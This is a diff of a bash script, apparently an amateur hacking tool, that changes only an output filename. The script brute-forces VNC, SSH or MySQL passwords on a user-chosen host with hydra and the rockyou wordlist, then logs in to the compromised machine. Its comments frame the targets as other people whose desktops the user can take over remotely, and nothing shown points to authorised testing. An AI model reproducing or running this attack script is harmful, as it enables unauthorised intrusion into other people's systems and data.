@@ -44,13 +44,13 @@ if [[ "$OSTYPE" == "darwin"* ]]; then
             read -p "Input Hostname: " host #allows the user to intpu the hostname for the cracking softwhere to work
 
             if [[ $service == 5900 ]] || [[ $service == "VNC" ]]; then #makes the user input "NONE" for them to crack prot 5900(VNC)
-                hydra -P rockyou.txt -t 64 -vV -o output.txt -I vnc://$host #Cracks the chocien persons password for 5900(VNC)
+                hydra -P rockyou.txt -t 64 -vV -o output.log -I vnc://$host #Cracks the chocien persons password for 5900(VNC)
                 echo "Loading VNC server..." #tells the user that VNC(5900) is loading
                 open vnc://$host #allows the user to remotly connect to the users Desktop to play with there desktop
                 exit; # stops the porgram
 
             elif [[ $service == 22 ]] || [[ $service == "ssh" ]]; then
-                hydra -l $user -P rockyou.txt -t 64 -vV -o output.txt -I ssh://$host #Cracks the chocien persons password for 22(SSH)
+                hydra -l $user -P rockyou.txt -t 64 -vV -o output.log -I ssh://$host #Cracks the chocien persons password for 22(SSH)
                 echo #this is a space in the program
                 echo "Connecting to $user@$host" #tell's the user that the software is trying to connecto to the-
                                                  #username and the hostname of the person that they hacked into
@@ -58,7 +58,7 @@ if [[ "$OSTYPE" == "darwin"* ]]; then
                 ssh $user@$host #this connects to the users computer by 22 (SSH[Secure Shell])
             
             elif [[ $service == 3306 ]] || [[ $service == "mysql" ]]; then 
-                hydra -l $user -P rockyou.txt -t 64 -vV -o output.txt -I mysql://$host #Cracks the chocien persons password for 3306(MySQL)
+                hydra -l $user -P rockyou.txt -t 64 -vV -o output.log -I mysql://$host #Cracks the chocien persons password for 3306(MySQL)
                 echo "Loading to MySQL server..."
                 sleep 3;
                 mysql -u $user -p -A #connects to the MySQL server
